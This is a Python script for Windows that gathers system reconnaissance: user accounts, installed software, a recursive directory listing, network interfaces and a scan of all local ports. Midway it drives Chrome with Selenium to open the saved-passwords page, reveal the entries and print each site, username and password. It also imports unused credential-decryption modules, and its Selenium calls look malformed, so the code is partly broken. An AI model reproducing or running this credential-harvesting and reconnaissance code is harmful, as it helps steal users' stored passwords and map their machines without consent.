import platform
import psutil
import socket
import netifaces
import concurrent.futures
import win32api
import win32security
import pywintypes
import win32net
import winreg
import subprocess
import sqlite3
import win32crypt
from selenium import webdriver
import pyautogui
import time

def All_Information ():

    print("          System Info\n________________________________________________________________\n")
    print(" System ID : ", platform.uname().node)
    System_ID = platform.uname().node

    print(" Operating System : ", platform.system())
    Operating_System = platform.system()

    print(" OS Version : ", platform.release())
    OS_Version = platform.release()

    print(" Processor : ", platform.processor())
    Processor = platform.processor()

    Ram = psutil.virtual_memory().total
    print(" Ram : ", Ram, "bytes")

    Disk = psutil.disk_usage('/')
    print(" Disk Info : ", Disk, " GB")

    User_Name = win32api.GetUserName()
    print(f"Username Run app: {User_Name}")

    Users = psutil.users()
    for user in Users:
        print("User Info : " , Users)

    All_Users_Net_User = subprocess.check_output("net user", shell=True).decode('utf-8')
    #print(All_Users_Net_User)

    All_Users = All_Users_Net_User.replace("\r\n", " ").replace(" User accounts for \\\\DESKTOP-EQCTKPO  ------------------------------------------------------------------------------- ","").replace("           ", "").replace("The command completed successfully.","").split()

    print(All_Users)

    def get_installed_programs():
        uninstall_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\Windows\\CurrentVersion\\Uninstall")
        installed_programs = []
        for i in range(0, winreg.QueryInfoKey(uninstall_key)[0]):
            subkey_name = winreg.EnumKey(uninstall_key, i)
            subkey = winreg.OpenKey(uninstall_key, subkey_name)
            try:
                display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                installed_programs.append(display_name)
            except FileNotFoundError:
                pass
        return installed_programs

    installed_programs = get_installed_programs()
    print("\n             All installed programs\n________________________________________________________________\n")
    print(installed_programs)
    print("\n________________________________________________________________")
    print ("            All Directoryn\n________________________________________________________________\n")
    Directory = subprocess.getoutput("dir /s")
    print(Directory)
    print("\n________________________________________________________________\n")
    print("\n           Network\n________________________________________________________________\n")
    

    # بارگذاری مرورگر گوگل کروم با کنترل کننده وب درایور
    browser = webdriver.Chrome()
    browser.get('chrome://settings/passwords')

    # پیدا کردن المان‌های HTML مورد نظر برای نمایش پسوردها
    show_passwords_button = browser.find_element('password-visibility-toggle')
    saved_passwords = browser.find_elements('password-list-item')

    # کلیک کردن بر روی دکمه نمایش پسوردها
    show_passwords_button.click()

    # استخراج پسوردها و ذخیره آن‌ها در لیست
    passwords = []
    for password in saved_passwords:
        site = password.find_element('password-list-item-name').text
        user = password.find_element('password-list-item-username').text
        pw = password.find_element('password-list-item-password').text
        passwords.append({'Site': site, 'Username': user, 'Password': pw})

    # نمایش پسوردها
    for password in passwords:
        print(password)

    # بستن مرورگر
    browser.close()


    print("IP Address In Internet : ", socket.gethostbyname(socket.gethostname()))
    Internet_Ip_Address = socket.gethostbyname(socket.gethostname())
    Local_Ip_Address = socket.gethostbyname('localhost')
    hostname = socket.gethostname()
    print("Hostname : ", hostname)
    print('Local Ip Address : ', Local_Ip_Address)
    All_Nics = psutil.net_if_addrs()
    for nic, addrs in All_Nics.items():
        for addr in addrs:
            if addr.family == netifaces.AF_INET:
                Enternet = f"{nic} : {addr.address}"
                print(Enternet)

    def check_port(port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            try:
                s.connect(('localhost', port))
                return port
            except:
                return None

    def find_open_ports():
        open_ports = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
            futures = [executor.submit(check_port, port) for port in range(1, 65536)]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    open_ports.append(result)
        return open_ports

    print("Open ports:", find_open_ports())


All_Information ()